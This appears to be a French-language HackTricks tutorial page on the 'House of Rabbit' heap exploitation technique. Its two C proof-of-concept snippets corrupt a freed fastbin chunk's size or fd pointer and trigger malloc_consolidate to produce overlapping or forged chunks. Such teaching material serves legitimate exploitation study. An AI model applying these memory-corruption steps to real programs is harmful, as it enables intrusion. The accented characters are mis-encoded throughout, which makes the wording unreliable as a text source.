# House of Rabbit

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Requirements

1. **Capacit√© √† modifier le pointeur fd de fast bin ou la taille** : Cela signifie que vous pouvez changer le pointeur avant d'un chunk dans le fastbin ou sa taille.
2. **Capacit√© √† d√©clencher `malloc_consolidate`** : Cela peut √™tre fait en allouant un grand chunk ou en fusionnant le chunk sup√©rieur, ce qui force le tas √† consolider les chunks.

### Goals

1. **Cr√©er des chunks qui se chevauchent** : Pour avoir un chunk qui se chevauche avec un autre, permettant d'autres manipulations du tas.
2. **Forger de faux chunks** : Pour tromper l'allocateur en faisant traiter un faux chunk comme un chunk l√©gitime lors des op√©rations sur le tas.

## Steps of the attack

### POC 1: Modifier la taille d'un chunk de fast bin

**Objectif** : Cr√©er un chunk qui se chevauche en manipulant la taille d'un chunk de fastbin.

* **√âtape 1 : Allouer des Chunks**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
Nous allouons deux morceaux de 0x40 octets chacun. Ces morceaux seront plac√©s dans la liste des fast bins une fois lib√©r√©s.

* **√âtape 2 : Lib√©rer les morceaux**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Nous lib√©rons les deux morceaux, les ajoutant √† la liste fastbin.

* **√âtape 3 : Modifier la taille du morceau**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Nous changeons les m√©tadonn√©es de taille de `chunk1` √† 0xa1. C'est une √©tape cruciale pour tromper l'allocateur lors de la consolidation.

* **√âtape 4 : D√©clencher `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Allouer un grand morceau d√©clenche la fonction `malloc_consolidate`, fusionnant de petits morceaux dans le fast bin. La taille manipul√©e de `chunk1` provoque un chevauchement avec `chunk2`.

Apr√®s la consolidation, `chunk1` chevauche `chunk2`, permettant une exploitation suppl√©mentaire.

### POC 2 : Modifier le pointeur `fd`

**Objectif** : Cr√©er un faux morceau en manipulant le pointeur `fd` du fast bin.

* **√âtape 1 : Allouer des morceaux**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Explication** : Nous allouons deux morceaux, un plus petit et un plus grand, pour pr√©parer le tas pour le faux morceau.

* **√âtape 2 : Cr√©er un faux morceau**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
Nous √©crivons de fausses m√©tadonn√©es de chunk dans `chunk2` pour simuler des chunks plus petits.

* **√âtape 3 : Lib√©rer `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Explication** : Nous lib√©rons `chunk1`, l'ajoutant √† la liste fastbin.

* **√âtape 4 : Modifier `fd` de `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Explication** : Nous changeons le pointeur avant (`fd`) de `chunk1` pour qu'il pointe vers notre faux chunk √† l'int√©rieur de `chunk2`.

* **√âtape 5 : D√©clencher `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Allouer un grand morceau d√©clenche √† nouveau `malloc_consolidate`, qui traite le faux morceau.

Le faux morceau devient partie de la liste fastbin, le rendant un morceau l√©gitime pour une exploitation ult√©rieure.

### R√©sum√©

La technique **House of Rabbit** implique soit de modifier la taille d'un morceau fast bin pour cr√©er des morceaux qui se chevauchent, soit de manipuler le pointeur `fd` pour cr√©er des morceaux factices. Cela permet aux attaquants de forger des morceaux l√©gitimes dans le tas, permettant diverses formes d'exploitation. Comprendre et pratiquer ces √©tapes am√©liorera vos comp√©tences en exploitation de tas.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
